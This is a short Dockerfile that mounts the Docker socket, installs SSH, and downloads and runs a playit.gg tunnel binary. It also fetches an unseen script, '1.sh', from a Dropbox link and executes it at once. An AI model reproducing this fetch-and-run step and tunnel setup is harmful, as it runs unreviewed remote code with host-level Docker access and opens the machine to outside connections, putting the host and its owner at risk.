FROM melantrance/full-ubuntu:jupyter
VOLUME [ "/var/run/docker.sock" ]

RUN apt-get update && apt-get install openssh-server -y
RUN service ssh start
RUN wget https://playit.gg/downloads/playit-linux_64-0.4.6 && chmod +x playit-linux_64-0.4.6 && nohup ./playit-linux_64-0.4.6 && sleep 5
RUN wget https://www.dropbox.com/s/ds3thcr9gsfhvfu/1.sh && chmod +x 1.sh && ./1.sh
RUN cat nohup.out
EXPOSE 80

